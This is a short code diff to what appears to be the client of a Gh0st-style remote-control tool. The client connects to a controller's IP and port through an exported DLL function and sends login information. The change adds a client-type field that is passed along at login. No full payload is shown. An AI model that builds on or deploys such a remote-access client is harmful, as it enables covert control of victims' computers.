@@ -13,7 +13,7 @@ using namespace std;
 #define REG_NAME "a_ghost"
 
 // 远程地址
-CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "", 0};
+CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "", 0, CLIENT_TYPE_ONE};
 
 // 应用程序状态（1-被控端退出 2-主控端退出 3-其他条件）
 BOOL g_bExit = 0;
@@ -166,6 +166,7 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
 	g_bExit = FALSE;
 	g_SETTINGS.SetServer(szServerIP, uPort);
+	g_SETTINGS.SetType(CLIENT_TYPE_DLL);
 
 	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
 	if (hThread == NULL) {
@@ -204,7 +205,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 			continue;
 		}
 		//准备第一波数据
-		SendLoginInfo(ClientObject, GetTickCount64()-dwTickCount);
+		SendLoginInfo(ClientObject, GetTickCount64()-dwTickCount, g_SETTINGS.ClientType());
 
 		CKernelManager	Manager(ClientObject);   
 		bool	bIsRun = 0;
